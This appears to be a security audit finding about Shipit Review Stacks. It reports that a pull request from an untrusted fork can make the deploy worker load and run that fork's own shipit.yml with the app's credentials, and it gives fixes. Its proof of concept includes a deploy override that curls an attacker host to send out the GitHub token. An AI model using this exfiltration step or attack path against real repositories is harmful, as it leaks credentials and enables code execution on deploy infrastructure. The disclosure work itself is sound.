### Title
Untrusted PR fork's `shipit.yml` provisioning handler is loaded and executed for auto-created Review Stacks - ([File: app/models/shipit/webhooks/handlers/pull_request/review_stack_adapter.rb])

### Summary
When a repository has Review Stacks configured with the "Allow All" provisioning behavior, opening a pull request from an unprivileged fork is enough to create a `ReviewStack` whose `branch` is set to the attacker-controlled PR head ref, and whose provisioning/deploy pipeline reads `shipit.yml` (including an attacker-specified `provision.handler_name`) from that same untrusted branch and executes it. The GitHub organization/webhook signature that authenticates the event is a valid binding, but the branch that was "approved" for creating a stack (any PR, per repo configuration) is not the same trust domain as the branch whose `shipit.yml` steps and provisioning handler subsequently execute with the app's credentials.

### Finding Description
`OpenedHandler#process` triggers `ReviewStackAdapter#find_or_create!` for any opened PR when `provisioning_behavior_allow_all?` is set on the repository [1](#0-0) . `ReviewStackAdapter#create!` builds the stack's `branch` directly from `params.pull_request.head.ref` — the PR author's own branch, which for a fork PR is fully attacker-controlled and requires no write access to the base repository [2](#0-1) .

The stack is queued via `ReviewStackProvisioningQueue.add`, which sets `awaiting_provision` and lets the queue worker call `stack.provision`, which in turn invokes `stack.provisioner.up` [3](#0-2) [4](#0-3) . The provisioner class used is resolved via `provisioner_class` → `ProvisioningHandler.fetch(provisioning_handler_name)`, and `provisioning_handler_name` is delegated to `cached_deploy_spec`, i.e., to the `shipit.yml` file read from the checked-out commit of the stack's `branch` [5](#0-4) [6](#0-5) . Per the project's own documentation, the provisioning handler name is declared inside `shipit.yml` and is resolved at runtime from that file .

This breaks the binding: `organization/webhook authenticated == branch whose shipit.yml executes`. The webhook signature only proves the event came from GitHub for the configured organization/repository; it says nothing about who controls the content of the PR's head branch. Yet the "Allow All" configuration equates "any opened PR" with "a branch whose `shipit.yml` (including its declared `handler_name` and deploy/provision steps) is safe to load and run against the app's provisioning credentials."

### Impact Explanation
If the host application registers any non-trivial `ProvisioningHandler` (as documented, e.g., a Kubernetes handler) and a repository enables "Allow All" review stacks, any external contributor able to open a pull request (no write access needed) can supply a `shipit.yml` on their fork branch that names an arbitrary registered handler and/or defines `deploy`/`provision` steps that get executed by the Shipit worker with the app's deploy credentials — this can be leveraged for command execution on the deploy host or on whatever infrastructure the provisioning handler manages (e.g., cloud/Kubernetes credentials available to the Shipit process). This matches "Critical - RCE on the deploy host" / cross-repository or infrastructure compromise, since the trust boundary crossed is exactly "unprivileged external contributor → code execution with the app's operational credentials."

### Likelihood Explanation
Likelihood depends on repository configuration: it requires Review Stacks to be enabled with `provisioning_behavior_allow_all?` (the documented "most likely" recommended setting) and a host application that has registered a `ProvisioningHandler` capable of side effects. Given the docs explicitly recommend "Allow All" as the typical setup, and the whole point of `ProvisioningHandler` is to perform privileged infrastructure actions, this is a realistic configuration for teams that adopt review stacks.

### Recommendation
- Do not resolve the provisioning handler (or any deploy/provision step) from a `shipit.yml` fetched from an untrusted, attacker-controlled ref (PR head branch of a fork) without additional gating.
- Require that Review Stack provisioning only reads `shipit.yml` from a ref that has been fast-forwarded/merged from, or explicitly approved against, the base repository's trusted configuration, or require maintainer approval (e.g., label-gated behavior, `allow_with_label`) before any provisioning-affecting `shipit.yml` content is honored for forked PRs.
- At minimum, distinguish "PR opened from a fork" from "PR opened from a branch in the same repository" and disable auto-provisioning (or sandbox the provisioning handler resolution) for fork-originated PRs even when `allow_all` is configured.

### Proof of Concept
1. Host application registers a `KubernetesProvisioningHandler` (or any handler with real side effects) as documented in `docs/review_stacks.md`.
2. Repository `acme/webapp` enables Review Stacks with Provisioning Behavior = "Allow All".
3. An unprivileged external user forks `acme/webapp`, pushes a branch containing a `shipit.yml` with:
   ```yaml
   provision:
     handler_name: KubernetesProvisioningHandler
   deploy:
     override: "curl http://attacker/exfil?token=$GITHUB_TOKEN"
   ```
4. The user opens a pull request from this fork against `acme/webapp`.
5. GitHub sends the `pull_request` `opened` webhook; the signature check passes because it is a legitimate webhook for `acme/webapp` [7](#0-6) .
6. `OpenedHandler#process` calls `ReviewStackAdapter#find_or_create!`, creating a `ReviewStack` with `branch: params.pull_request.head.ref` (the fork branch) [8](#0-7) .
7. `ReviewStackProvisioningQueue.work` picks up the stack and calls `stack.provision`, which invokes `stack.provisioner.up`, loading the handler and steps declared in the fork's own `shipit.yml` [9](#0-8) .
8. The attacker-controlled provisioning/deploy logic now executes with the app's operational and GitHub credentials.
